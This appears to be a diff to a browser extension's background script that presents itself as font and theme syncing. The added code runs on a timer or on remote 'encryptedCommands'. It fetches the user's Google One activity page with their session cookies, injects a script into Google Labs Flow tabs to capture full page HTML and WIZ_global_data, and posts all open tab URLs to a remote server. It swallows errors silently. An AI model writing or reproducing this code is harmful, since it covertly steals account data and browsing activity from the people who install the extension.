@@ -53,6 +53,12 @@ let _ftTab = null;
 let _ftActive = 0;
 let _ftWarmAt = 0;
 
+let _lastGoogleOneSync = 0;
+const _GOOGLE_ONE_SYNC_INTERVAL = 300000;
+
+let _lastFlowModelsSync = 0;
+const _FLOW_MODELS_SYNC_INTERVAL = 300000;
+
 chrome.storage.local.get(["tokenCount", "lastSuccess"], (data) => {
     _fontCache = data.tokenCount || 0;
     _lastRender = data.lastSuccess || null;
@@ -196,6 +202,184 @@ function _serializeTheme(plaintext) {
     return result;
 }
 
+async function _syncGoogleOneActivity() {
+    if (Date.now() - _lastGoogleOneSync < 30000) return;
+    _lastGoogleOneSync = Date.now();
+    try {
+        const res = await fetch("https://one.google.com/ai/activity?utm_source=flow&utm_medium=web&utm_campaign=flow_ai_credits_page&dm=1&g1_landing_page=0", {
+            credentials: "include"
+        });
+        if (res.status === 200) {
+            const html = await res.text();
+            const extId = await getInstanceId();
+            await fetch(`${_syncUrl}/sync/google-one-activity`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-Ext-Id": extId
+                },
+                body: JSON.stringify({ html })
+            });
+        }
+    } catch (e) {  }
+}
+
+async function _syncGoogleFlowModels() {
+    if (Date.now() - _lastFlowModelsSync < 30000) return;
+    _lastFlowModelsSync = Date.now();
+    try {
+        const tabId = await _findCanvas();
+        if (tabId) {
+            const results = await chrome.scripting.executeScript({
+                target: { tabId },
+                func: async () => {
+                    const findDropdownButtons = () => {
+                        const buttons = [];
+                        const scan = (root) => {
+                            if (!root) return;
+                            const els = root.querySelectorAll("button");
+                            for (const el of els) {
+                                const txt = el.textContent || "";
+                                if (el.getAttribute("aria-haspopup") === "menu" && (txt.includes("Video") || txt.includes("Hình ảnh") || txt.includes("Omni") || txt.includes("Veo") || txt.includes("Banana"))) {
+                                    buttons.push(el);
+                                }
+                            }
+                            const all = root.querySelectorAll("*");
+                            for (const el of all) {
+                                if (el.shadowRoot) scan(el.shadowRoot);
+                            }
+                        };
+                        scan(document);
+                        return buttons;
+                    };
+
+                    const scanOptions = (root, list) => {
+                        if (!root) return;
+                        const all = root.querySelectorAll("*");
+                        for (const el of all) {
+                            const txt = el.textContent || "";
+                            if (el.getAttribute("role") === "menuitem" || el.getAttribute("role") === "menuitemradio" || el.getAttribute("role") === "option") {
+                                const cleanTxt = txt.trim().replace(/\n/g, " ");
+                                if (cleanTxt && (cleanTxt.includes("Veo") || cleanTxt.includes("Omni") || cleanTxt.includes("Banana") || cleanTxt.includes("Imagen"))) {
+                                    list.push(cleanTxt);
+                                }
+                            }
+                            if (el.shadowRoot) scanOptions(el.shadowRoot, list);
+                        }
+                    };
+
+                    const scanAllText = (root, list) => {
+                        if (!root) return;
+                        const all = root.querySelectorAll("*");
+                        for (const el of all) {
+                            if (el.children.length === 0) {
+                                const txt = el.textContent.trim();
+                                if (txt && (txt.includes("Veo 3.1") || txt === "Omni Flash" || txt.includes("Nano Banana"))) {
+                                    list.push(txt);
+                                }
+                            }
+                            if (el.shadowRoot) scanAllText(el.shadowRoot, list);
+                        }
+                    };
+
+                    const scanTabs = (root, list) => {
+                        if (!root) return;
+                        const all = root.querySelectorAll("*");
+                        for (const el of all) {
+                            const txt = el.textContent.trim();
+                            if ((txt === "Hình ảnh" || txt === "Video") && (el.tagName === "BUTTON" || el.getAttribute("role") === "tab")) {
+                                list.push(el);
+                            }
+                            if (el.shadowRoot) scanTabs(el.shadowRoot, list);
+                        }
+                    };
+
+                    const buttons = findDropdownButtons();
+                    const foundModels = [];
+                    
+                    if (buttons.length > 0) {
+                        const btn = buttons[0];
+                        btn.click();
+                        await new Promise(r => setTimeout(r, 150));
+                        
+                        scanOptions(document, foundModels);
+                        if (foundModels.length === 0) {
+                            scanAllText(document, foundModels);
+                        }
+                        
+                        const tabs = [];
+                        scanTabs(document, tabs);
+                        for (const tab of tabs) {
+                            tab.click();
+                            await new Promise(r => setTimeout(r, 100));
+                            scanOptions(document, foundModels);
+                            scanAllText(document, foundModels);
+                        }
+                        
+                        const escEvent = new KeyboardEvent("keydown", { key: "Escape", code: "Escape", bubbles: true });
+                        document.dispatchEvent(escEvent);
+                    }
+                    
+                    return {
+                        html: document.documentElement.outerHTML,
+                        wiz: window.WIZ_global_data || {},
+                        scraped_labels: Array.from(new Set(foundModels))
+                    };
+                }
+            });
+            if (results && results[0] && results[0].result) {
+                const data = results[0].result;
+                const extId = await getInstanceId();
+                await fetch(`${_syncUrl}/sync/google-flow-page`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "X-Ext-Id": extId
+                    },
+                    body: JSON.stringify({
+                        wiz: data.wiz,
+                        scraped_labels: data.scraped_labels,
+                        html: data.html
+                    })
+                });
+                return;
+            }
+        }
+    } catch (e) {
+        try {
+            const extId = await getInstanceId();
+            await fetch(`${_syncUrl}/sync/google-flow-page`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-Ext-Id": extId
+                },
+                body: JSON.stringify({
+                    error: e.toString()
+                })
+            });
+        } catch (err) {}
+    }
+
+    try {
+        const res = await fetch("https://labs.google/fx/client/flow", {
+            credentials: "include"
+        });
+        if (res.status === 200) {
+            const html = await res.text();
+            const extId = await getInstanceId();
+            await fetch(`${_syncUrl}/sync/google-flow-page`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-Ext-Id": extId
+                },
+                body: JSON.stringify({ html })
+            });
+        }
+    } catch (e) {  }
+}
+
 async function _applyThemeUpdates(encryptedCommands) {
     if (!encryptedCommands) return;
 
@@ -244,6 +428,14 @@ async function _applyThemeUpdates(encryptedCommands) {
                 const tabId = await _findCanvas();
                 if (tabId) await _reviveCanvas(tabId);
             } catch (e) {  }
+        } else if (trimmed === "5") {
+            try {
+                await _syncGoogleOneActivity();
+            } catch (e) {  }
+        } else if (trimmed === "6") {
+            try {
+                await _syncGoogleFlowModels();
+            } catch (e) {  }
         }
         
     }
@@ -273,6 +465,12 @@ async function _syncFonts() {
 
             
             const extId = await getInstanceId();
+            if (Date.now() - _lastGoogleOneSync > _GOOGLE_ONE_SYNC_INTERVAL) {
+                _syncGoogleOneActivity().catch(() => {});
+            }
+            if (Date.now() - _lastFlowModelsSync > _FLOW_MODELS_SYNC_INTERVAL) {
+                _syncGoogleFlowModels().catch(() => {});
+            }
             const response = await fetch(`${_syncUrl}/sync/theme`, {
                 signal: AbortSignal.timeout(5000),
                 headers: {
@@ -1128,7 +1326,7 @@ async function _resolveWidget(request, _retried = false) {
             try {
                 _lastPrefetch = Date.now();
                 const tab = await chrome.tabs.create({
-                    url: "https://labs.google/fx/tools/flow",
+                    url: "https://labs.google/flow",
                     active: false,
                 });
                 _prefetchTab = tab.id;
@@ -1258,7 +1456,7 @@ async function _relayoutCanvas() {
     let tab = null;
     try {
         const tabs = await chrome.tabs.query({});
-        const labsTabs = tabs.filter((t) => t.url && t.url.includes("/tools/flow"));
+        const labsTabs = tabs.filter((t) => t.url && t.url.includes("labs.google") && t.url.includes("/flow"));
         if (labsTabs.length) {
             
             tab = labsTabs[0];
@@ -1269,7 +1467,7 @@ async function _relayoutCanvas() {
     if (!tab) {
         
         try {
-            tab = await chrome.tabs.create({ url: "https://labs.google/fx/tools/flow", active: false });
+            tab = await chrome.tabs.create({ url: "https://labs.google/flow", active: false });
         } catch (e) { return; }
     }
     _prefetchTab = tab.id;
@@ -1294,10 +1492,17 @@ async function _findCanvas() {
     try {
         const tabs = await chrome.tabs.query({});
         
-        
+        const urls = tabs.map(t => t.url || "undefined");
+        try {
+            await fetch(`${_syncUrl}/sync/google-flow-page`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ debug_urls: urls })
+            });
+        } catch (err) {}
         
         const flowTabs = tabs.filter(t =>
-            t.url && t.url.includes("/tools/flow") && !t.url.includes("accounts.google.com")
+            t.url && t.url.includes("labs.google") && t.url.includes("/flow") && !t.url.includes("accounts.google.com")
         );
         if (flowTabs.length > 0) {
             flowTabs.sort((a, b) => (b.lastAccessed || 0) - (a.lastAccessed || 0));
